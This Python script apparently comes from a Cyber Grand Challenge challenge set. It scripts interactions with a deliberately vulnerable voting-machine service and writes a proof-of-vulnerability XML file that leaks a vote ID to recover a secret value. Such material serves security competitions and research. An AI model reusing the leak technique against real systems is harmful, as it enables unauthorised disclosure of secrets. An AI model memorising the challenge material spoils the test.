#!/usr/bin/env python
#
# Copyright (C) 2014 Narf Industries <info@narfindustries.com>
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
# CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
# SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#

from generator.actions import Actions, Variable
from random import choice, randint
from os.path import dirname, abspath, join
import sys
import struct


sys.path.append(join(dirname(dirname(dirname(abspath(__file__)))), "support"))
import support as sp
from common import DEBUG, CONFIG
from election import Election, ElectionManager, Voter, Candidate, Vote

class VotingMachine(Actions):

    ELECTION_NAME           = "Enter election name: "
    ELECTION_CREATED        = "Election Created.\n"
    ELECTION_OPEN           = "Voting Open.\n"
    ELECTION_CLOSED         = "Voting Closed.\n"
    CREATE_E_MGR            = "## Create election manager ##\n"
    CREATE_VOTER            = "## Create voter ##\n"
    CREATE_CANDIDATE        = "## Create candidate ##\n"
    CANDIDATE_ADDED         = "Candidate Added.\n"
    CANDIDATE_INVALID       = "New candidate invalid\n"

    ZERO_CANDIDATES         = "\tThere were zero candidates.\n"
    CANDIDATE_ORDER         = "\t| Rank | Votes | Candidate Name |\n"
    ZERO_VOTERS             = "\tThere were zero voters.\n"
    VOTER_ORDER             = "\t| Voted? | Voter Name |\n"

    VOTING_RESULTS          = "## Voting Results ##\n"
    CANDIDATE_SUMMARY       = "## Candidate Summary ##\n"
    VOTER_TURNOUT           = "## Voter Turnout ##\n"

    SELECT_CANDIDATE        = "Select one candidate from the folloowing:\n"
    EMPTY_CANDIDATES        = "There are no candidates. Go add some.\n"
    FULL_CANDIDATES         = "Not accepting additional candidates.\n"
    INVALID_CANDIDATE       = "Invalid candidate. Try again.\n"

    F_NAME                  = "\tEnter first name: "
    L_NAME                  = "\tEnter last name: "

    ENTER_ID                = "\tEnter your ID number: "
    ENTER_AUTH_KEY          = "\tEnter auth key: "
    NEW_AUTH_KEY            = "\tYour auth key is: "
    NEW_UID                 = "\tYour ID number is: "

    NUM_WINNERS_Q           = "Enter number of election winners desired: "
    MAX_CANDIDATES_Q        = "Enter the max number of candidates allowed: "
    WRITE_IN_OK_Q           = "Can voters write-in new candidates? (Yy/Nn): "

    CHOOSE                  = "Choose an option: "

    MENU_LOGIN              = "14: Login\n"
    MENU_MAIN               = "15: Main Menu\n"
    MENU_CREATE_ELECTION    = "17: Create Election\n"
    MENU_OPEN_VOTING        = "18. Open Voting\n"
    MENU_CLOSE_VOTING       = "20. Close Voting\n"
    MENU_ELECTION_STATUS    = "22. Election Status\n"

    MENU_REGISTER_VOTER     = "38. Register Voter\n"
    MENU_VOTE               = "36. Vote\n"
    MENU_ADD_CANDIDATE      = "54. Add Candidate\n"
    MENU_VOTING_RESULTS     = "56. Voting Results\n"
    MENU_VOTER_TURNOUT      = "72. Voter Turnout\n"
    MENU_CANDIDATE_SUMMARY  = "88. Candidate Summary\n"

    MENU_QUIT               = "95. Quit\n"

    FAIL                    = "Is voting too hard?!\n"

    MENU_ENTRIES            = {
                                0x0E: MENU_LOGIN,
                                0x0F: MENU_MAIN,

                                0x11: MENU_CREATE_ELECTION,
                                0x12: MENU_OPEN_VOTING,
                                0x14: MENU_CLOSE_VOTING,
                                0x16: MENU_ELECTION_STATUS,

                                0x24: MENU_VOTE,
                                0x26: MENU_REGISTER_VOTER,

                                0x36: MENU_ADD_CANDIDATE,

                                0x38: MENU_VOTING_RESULTS,
                                0x48: MENU_VOTER_TURNOUT,
                                0x58: MENU_CANDIDATE_SUMMARY,

                                0x5F: MENU_QUIT,
                            }

    def _receive_by_len(self, a_str, delim='', term=''):
        line = "{0}{1}{2}".format(a_str, delim, term)
        self.read(length=len(line), expect=line)

    def _receive_by_delim(self, delim=''):
        self.read(delim=delim)

    def _send_str(self, cmd):
        self.write(sp.pack_single_string("{0}{1}".format(cmd, CONFIG['DELIM'])))

    def _receive_prompt_send_answer(self, prompt, answer):
        self._receive_by_len(prompt, term=CONFIG['TERM'])
        self._send_str(answer)

    # def _recv_name(self, name):
    #     # recv NNAME prompt
    #     self._recv_string(self.NNAME)
    #     # recv name
    #     self._recv_string(name)

    def _send_first_last_name(self, f_name, l_name):
        self._receive_prompt_send_answer(self.F_NAME, f_name)
        self._receive_prompt_send_answer(self.L_NAME, l_name)


    # def _recv_string(self, aStr):
    #     self.read(delim=CONFIG['TERM'], expect=sp.pack_single_string(aStr))

    # def _recv_conf_num(self):
    #     self.read(length=8, expect=sp.pack_single_uint64(self._get_next_conf_num()))

    # def _recv_next_tid(self, citizen=None):
    #     if citizen is not None:
    #         s  = self.magic_page[ord(citizen.name[0])]
    #         s += self.magic_page[ord(citizen.name[1])]
    #         s += self.magic_page[ord(citizen.name[2])]
    #         s += self.magic_page[ord(citizen.name[3])]
    #         if DEBUG:
    #             print "tid:{0}{1}{2}{3}".format(hex(ord(s[0]))[2:], hex(ord(s[1]))[2:], hex(ord(s[2]))[2:], hex(ord(s[3]))[2:])
    #         # self.read(length=4, expect=sp.pack_single_string(s))
    #         self.read(length=4, expect=sp.pack_single_string(s), assign=self.state['tid'])
    #     else:
    #         self.read(length=4, expect=r'(.*)', expect_format='pcre')

    # def _get_next_conf_num(self):
    #     self.state['cn'] += 1
    #     return self.state['cn'] - 1

    def _is_menu_id_valid_op(self, menu_id):
        creds = False
        op = 0 != (menu_id & self.state['e'].state)

        if 0x0E == menu_id:
            creds = (False == self.state['e'].have_authd_user())
        elif 0x0F == menu_id:
            creds = (True == self.state['e'].have_authd_user())

        elif 0x11 == menu_id:
            creds = (False == self.state['e'].have_authd_user())
        elif 0x12 == menu_id:
            creds = (True == self.state['e'].have_authd_e_mgr())
        elif 0x14 == menu_id:
            creds = (True == self.state['e'].have_authd_e_mgr())
        elif 0x16 == menu_id:
            creds = (True == self.state['e'].have_authd_e_mgr())

        elif 0x24 == menu_id:
            creds = (True == self.state['e'].have_authd_voter())
        elif 0x26 == menu_id:
            creds = (False == self.state['e'].have_authd_user())

        elif 0x36 == menu_id:
            creds = (((True == self.state['e'].have_authd_e_mgr()) or \
                    ((True == self.state['e'].have_authd_user()) and (1 == self.state['e'].write_in_ok))) and \
                    (self.state['e'].get_candidate_count() < self.state['e'].max_candidates))

        elif 0x38 == menu_id:
            creds = (True == self.state['e'].have_authd_user())
        elif 0x48 == menu_id:
            creds = (True == self.state['e'].have_authd_e_mgr())
        elif 0x58 == menu_id:
            creds = (True == self.state['e'].have_authd_e_mgr())
        else:
            creds = False

        return op and creds

    def _receive_fail(self):
        self._receive_by_len(self.FAIL, term=CONFIG['TERM'])

    def _process_menu(self):
        '''
        Receive the relevant lines in the menu.

        # login_menu
        # admin_menu
        # voting_menu
        # results_menu
        # quit entry
        '''
        cmds = self.MENU_ENTRIES.keys()
        cmds.sort()
        menu = ''
        for m_id in cmds:
            if True == self._is_menu_id_valid_op(m_id):
                menu += self.MENU_ENTRIES[m_id] + CONFIG['TERM']

        menu += self.MENU_QUIT + CONFIG['TERM']
        self._receive_by_len(menu)

        self._receive_by_len(self.CHOOSE, term=CONFIG['TERM'])

    def _back_to_main_menu(self):
        '''
        Option to go from sub_menu back to main_menu.
        '''
        self._process_menu()

        cmd = 0x0F
        self._send_str(cmd)

        if True == self._is_menu_id_valid_op(cmd):
            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1

    def _create_election(self):
        '''
        Create the election manager profile and setup the election parameters
        '''
        self._process_menu()

        self.state['e'].authd_user = None

        cmd = 0x11
        self._send_str(cmd)

        if True == self._is_menu_id_valid_op(cmd):

            # create election mgr
            self._receive_by_len(self.CREATE_E_MGR, term=CONFIG['TERM'])
            mgr = self.state['e'].make_random_e_mgr()
            self._send_first_last_name(mgr.f_name, mgr.l_name)
            self._receive_by_len(self.NEW_UID)
            self._receive_by_len(mgr.id, delim=CONFIG['DELIM'])
            self._receive_by_len(self.NEW_AUTH_KEY)
            auth_key = Variable('authkey')
            auth_key.set_slice(0)
            self.read(delim=CONFIG['DELIM'], assign=auth_key)
            self.state['e'].set_e_mgr_auth_key(auth_key)

            # send election name
            self._receive_prompt_send_answer(self.ELECTION_NAME, self.state['e'].name)

            # set election conf
            num_winners = randint(1, 4)
            max_candidates = randint(5, 20)
            write_in_ok = choice(['Y', 'N'])
            self._receive_prompt_send_answer(self.NUM_WINNERS_Q, num_winners)
            self._receive_prompt_send_answer(self.MAX_CANDIDATES_Q, max_candidates)
            self._receive_prompt_send_answer(self.WRITE_IN_OK_Q, write_in_ok)

            self.state['e'].num_winners = num_winners
            self.state['e'].max_candidates = max_candidates
            self.state['e'].write_in_ok = 1 if 'Y' == write_in_ok else 0
            self.state['e'].is_configured = True

            # set state to NEW
            self.state['e'].set_state('NEW')

            # recv ELECTION_CREATED
            self._receive_by_len(self.ELECTION_CREATED, term=CONFIG['TERM'])
            return 0
        else:
            self._receive_fail()
            return -1

    def _register_voter(self):
        '''
        Register a new voter
        '''
        self._process_menu()
        cmd = 0x26
        self._send_str(cmd)
        self.state['e'].authd_user = None

        if True == self._is_menu_id_valid_op(cmd):
            self._receive_by_len(self.CREATE_VOTER, term=CONFIG['TERM'])

            voter = self.state['e'].make_random_voter()
            # send voter's first and last name
            self._send_first_last_name(voter.f_name, voter.l_name)

            # receive "NEW_UID" msg and voter's ID
            self._receive_by_len(self.NEW_UID)
            self._receive_by_len(voter.id, delim=CONFIG['DELIM'])

            self.state['e'].add_voter(voter)
            return 0
        else:
            self._receive_fail()
            return -1

    def _login(self, who="VOTER"):
        '''
        Login either a voter or the election manager, or cause login error
        '''
        self._process_menu()
        cmd = 0x0E
        self._send_str(cmd)

        if True == self._is_menu_id_valid_op(cmd):
            self.state['e'].authd_user = None
            user = None
            if who is "ERROR":
                user = self.state['e'].make_random_voter(is_valid=False)
            elif who is "E_MGR":
                user = self.state['e'].e_mgr
            elif who is "VOTER":
                user = self.state['e'].get_random_voter()
                if user is None:
                    who = "ERROR"
                    user = self.state['e'].make_random_voter(is_valid=False)

            # send creds
            self._receive_prompt_send_answer(self.ENTER_ID, user.id)
            self._receive_prompt_send_answer(self.L_NAME, user.l_name)

            if who is "E_MGR":
                self._receive_by_len(self.ENTER_AUTH_KEY, term=CONFIG['TERM'])
                self.write(user.auth_key) # auth_key is a Variable()

            if who is "ERROR":
                self._receive_fail()
                return -1
            else:
                self.state['e'].authd_user = user

            return 0
        else:
            self._receive_fail()
            return -1

    def _open_voting(self):
        '''
        Set voting to OPEN state
        '''
        self._process_menu()
        cmd = 0x12
        self._send_str(cmd)

        if True == self._is_menu_id_valid_op(cmd):
            self.state['e'].set_state('OPEN')
            self._receive_by_len(self.ELECTION_OPEN, term=CONFIG['TERM'])

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1

    def _close_voting(self):
        '''
        Set voting to CLOSED state
        '''
        self._process_menu()
        cmd = 0x14
        self._send_str(cmd)

        if True == self._is_menu_id_valid_op(cmd):
            self.state['e'].set_state('CLOSED')
            self._receive_by_len(self.ELECTION_CLOSED, term=CONFIG['TERM'])

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1


    def _election_status(self):
        '''
        Get the status of the election.
        '''
        self._process_menu()
        cmd = 0x16
        self._send_str(cmd)

        fmt = "\tNumber of voters: {0}\n\tNumber of votes: {1}\n\tNumber of candidates: {2}\n"

        if True == self._is_menu_id_valid_op(cmd):
            msg = fmt.format(self.state['e'].get_voter_count(),
                                self.state['e'].get_vote_count(),
                                self.state['e'].get_candidate_count())
            self._receive_by_len(msg)

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1

    def _add_candidate(self):
        '''
        Add a new candidate for the election.
        '''
        self._process_menu()
        cmd = 0x36
        self._send_str(cmd)


        if True == self._is_menu_id_valid_op(cmd):

            if self.state['e'].get_candidate_count() >= self.state['e'].max_candidates:
                self._receive_by_len(self.FULL_CANDIDATES, term=CONFIG['TERM'])
            else:
                self._receive_by_len(self.CREATE_CANDIDATE, term=CONFIG['TERM'])

                candidate = self.state['e'].make_random_candidate()
                # send first and last name
                self._send_first_last_name(candidate.f_name, candidate.l_name)

                if False:
                    self._receive_by_len(self.CANDIDATE_INVALID, term=CONFIG['TERM'])

                self._receive_by_len(self.CANDIDATE_ADDED, term=CONFIG['TERM'])
                self.state['e'].add_candidate(candidate)

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1

    def _vote(self):
        '''
        Place a vote.
        '''
        self._process_menu()
        cmd = 0x24
        self._send_str(cmd)


        if True == self._is_menu_id_valid_op(cmd):

            # check to see if there are any candidates to vote for
            if 0 == self.state['e'].get_candidate_count():
                self._receive_by_len(self.EMPTY_CANDIDATES, term=CONFIG['TERM'])
            else:
                # read candidate list
                self._receive_by_len(self.SELECT_CANDIDATE, term=CONFIG['TERM'])
                fmt = "\t{0}: {1} {2}\n"
                for c in self.state['e'].candidates:
                    line = fmt.format(c.id, c.f_name, c.l_name)
                    self._receive_by_len(line)

                self._receive_by_len(self.CHOOSE, term=CONFIG['TERM'])

                # make selection
                c = self.state['e'].get_random_candidate()
                self._send_str(c.id)

                # receive voting receipt
                p1 = "Confirmation #"
                p2 = " Vote recorded for candidate: {0} {1}.\n"

                self._receive_by_len(p1)

                vote_id = Variable('voteid{0}'.format(self.state['e'].authd_user.id))
                vote_id.set_slice(0)
                self.read(delim='.', assign=vote_id)

                self._receive_by_len(p2.format(c.f_name, c.l_name))

                # record vote
                v = Vote(vote_id, self.state['e'].authd_user, c)
                self.state['e'].add_vote(v)

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1

    def _voting_results(self):
        '''
        Get the voting results
        '''
        self._process_menu()
        cmd = 0x38
        self._send_str(cmd)

        if True == self._is_menu_id_valid_op(cmd):
            self._receive_by_len(self.VOTING_RESULTS, term=CONFIG['TERM'])

            # check to see if there were any candidates voted for
            if 0 == self.state['e'].get_candidate_count():
                self._receive_by_len(self.ZERO_CANDIDATES, term=CONFIG['TERM'])
            else:
                # calculate voting results
                v_res = self.state['e'].get_voting_results()

                # read candidate list
                self._receive_by_len(self.CANDIDATE_ORDER, term=CONFIG['TERM'])
                fmt = "\t{0}.\t{1}\t"
                winners = 0
                for (count, c) in v_res:
                    if winners >= self.state['e'].num_winners:
                        break
                    winners += 1
                    line = fmt.format(winners, count)
                    self._receive_by_len(line)
                    # use a wild card recv for the name portion because python and C code
                    # have different results from a sort with multiple equal sort-keys.
                    self._receive_by_delim(delim='\n')

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1

    def _voter_turnout(self):
        '''
        Get the voter turnout results
        '''
        self._process_menu()
        cmd = 0x48
        self._send_str(cmd)
        fmt = "\tNumber of voters: {0}\n\tNumber of votes: {1}\n";

        if True == self._is_menu_id_valid_op(cmd):
            self._receive_by_len(self.VOTER_TURNOUT, term=CONFIG['TERM'])

            if 0 is self.state['e'].get_voter_count():
                self._receive_by_len(self.ZERO_VOTERS, term=CONFIG['TERM'])
            else:
                # get counts
                line = fmt.format(self.state['e'].get_voter_count(), self.state['e'].get_vote_count())
                self._receive_by_len(line)

                # get all voters
                self._receive_by_len(self.VOTER_ORDER, term=CONFIG['TERM'])
                for i in range(self.state['e'].get_voter_count()):
                    # use a wild card recv for the names portion because python and C code
                    # have different ordering when reading all values from a hash table.
                    self._receive_by_delim(delim='\n')

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1

    def _candidate_summary(self):
        '''
        Get the candidate summary
        '''
        self._process_menu()
        cmd = 0x58
        self._send_str(cmd)
        fmt = "\tNumber of candidates: {0}\n";

        if True == self._is_menu_id_valid_op(cmd):
            self._receive_by_len(self.CANDIDATE_SUMMARY, term=CONFIG['TERM'])

            if 0 is self.state['e'].get_voter_count():
                self._receive_by_len(self.ZERO_CANDIDATES, term=CONFIG['TERM'])
            else:
                # get counts
                line = fmt.format(self.state['e'].get_candidate_count())
                self._receive_by_len(line)

                # read candidate list
                v_res = self.state['e'].get_voting_results()
                self._receive_by_len(self.CANDIDATE_ORDER, term=CONFIG['TERM'])
                fmt = "\t{0}.\t{1}\t"
                winners = 0
                for (count, c) in v_res:
                    winners += 1
                    line = fmt.format(winners, count)
                    self._receive_by_len(line)
                    # use a wild card recv for the name portion because python and C code
                    # have different results from a sort with multiple equal sort-keys.
                    self._receive_by_delim(delim='\n')

            self.state['e'].authd_user = None
            return 0
        else:
            self._receive_fail()
            return -1


    def _quit(self):
        '''
        Quit cleanly
        '''
        self._process_menu()
        cmd = 0x5F
        self._send_str(cmd)
        return -1

    def start(self):
        self.state['e'] = Election()

    def init_state(self):
        '''
        Process the Election in the INIT state
        '''
        return self._create_election()

    def new_state(self):
        '''
        Process the Election in the NEW state
        '''
        # create some voters
        # for i in range(randint(5,15)):
        if 0 != self._register_voter():
            return -1

        # add a candidate
        if 0 != self._login("E_MGR") or 0 != self._add_candidate():
            return -1

        # open voting
        if 0 != self._login("E_MGR") or 0 != self._open_voting():
            return -1

        return 0

    def open_state(self):
        '''
        Process the Election in the OPEN state
        '''
        # do some voting
        # for v in range(5, self.state['e'].get_voter_count()):
        if 0 != self._login("VOTER") or 0 != self._vote():
            return -1

        return 0


    def closed_state(self):
        '''
        Process the Election in the CLOSED state
        '''
        # check voting results
        if self.chance(0.5):
            if 0 != self._login("E_MGR") or 0 != self._voting_results():
                return -1
        else:
            if 0 != self._login("VOTER") or 0 != self._voting_results():
                return -1

        # check voter turnout
        if 0 != self._login("E_MGR") or 0 != self._voter_turnout():
            return -1

        # check candidate summary
        if 0 != self._login("E_MGR") or 0 != self._candidate_summary():
            return -1

        return 0



HEAD="""<?xml version="1.0" standalone="no" ?>
<!DOCTYPE cfepov SYSTEM "/usr/share/cgc-docs/cfe-pov.dtd">
<cfepov>
<cbid>service</cbid>
<replay>
    <negotiate><type2 /></negotiate>
"""

FLAG_READ="""
    <!-- Read 10 byte string (vote ID) which we need to get the TYPE2_VALUE -->"""

FOOT="""
    <!-- bogus write, so I can re-mort the code and access the var to extract the TYPE2_VALUE -->
    <write><var>voteid12341234</var></write>
    <!-- Submit (TYPE2_VALUE) <= (vote_id xor voter.id) -->
    <submit><var>voteid12341234</var></submit>

</replay>
</cfepov>
"""

import os
if __name__ == "__main__":
    POV_DIR=os.path.dirname(__file__)
    POV1_PATH=os.path.join(POV_DIR, 'POV_1c.povxml')
    # POV2_PATH=os.path.join(POV_DIR, 'POV_00002.povxml')

    tmpl1 = VotingMachine()
    tmpl1.start()
    tmpl1.init_state()
    tmpl1.new_state()
    tmpl1.open_state()
    tmpl1._quit()
    xml_body1  = HEAD.split("\n")
    xml_body1 += tmpl1.xml().split("\n")[5:-7]

    xml_body1 += FLAG_READ.split("\n")
    xml_body1 += tmpl1.xml().split("\n")[-7:-2]
    xml_body1 += FOOT.split("\n")
    combined_xml1 = "\n".join(xml_body1)


    # if not os.path.exists(POV_DIR):
    #     os.mkdir(POV_DIR)

    with open(POV1_PATH, 'w') as f:
        f.write(combined_xml1)

    # with open(POV2_PATH, 'w') as f:
    #     f.write(combined_xml2)

